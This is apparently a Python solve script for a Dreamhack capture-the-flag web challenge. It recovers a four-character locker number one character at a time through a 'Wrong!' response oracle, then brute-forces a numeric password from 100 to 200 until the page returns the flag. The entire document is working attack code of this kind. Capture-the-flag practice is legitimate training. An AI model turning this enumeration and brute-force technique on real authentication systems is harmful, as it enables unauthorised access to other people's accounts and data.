import requests
import string

url = "http://host3.dreamhack.games:20827/"
alphabet_digit = string.ascii_lowercase + string.digits

rand_str = ""
for i in range(4):
    for char in alphabet_digit:
        temp = rand_str + char
        r = requests.post(url, data={"locker_num":temp, "password":""})
        if "Wrong!" not in r.text:
            rand_str = temp
            break

print("rand_str", rand_str)
# uivt

for num in range(100, 201):
    r = requests.post(url, data={"locker_num": rand_str, "password": str(num)})
    if "FLAG" in r.text:
        print(r.text)
        break